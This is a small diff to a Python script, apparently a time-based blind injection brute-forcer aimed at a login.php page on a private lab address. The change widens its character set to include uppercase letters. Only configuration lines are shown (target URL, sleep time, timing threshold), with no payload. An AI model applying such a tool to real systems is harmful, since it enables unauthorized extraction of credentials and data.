@@ -10,7 +10,7 @@ def def_handler(sig, frame):
 signal.signal(signal.SIGINT, def_handler)
 
 url = "http://10.88.0.2/login.php"
-characters = 'etaoinshrdlucmfwypvbgkqjxz0123456789_-$'  # orden de frecuencia
+characters = 'etaoinshrdlucmfwypvbgkqjxz0123456789_-$ABCDEFGHIJKLMNOPQRSTUVWXYZ'  # orden de frecuencia
 SLEEP_TIME = 2
 THRESHOLD = 1.3
 session = requests.Session()
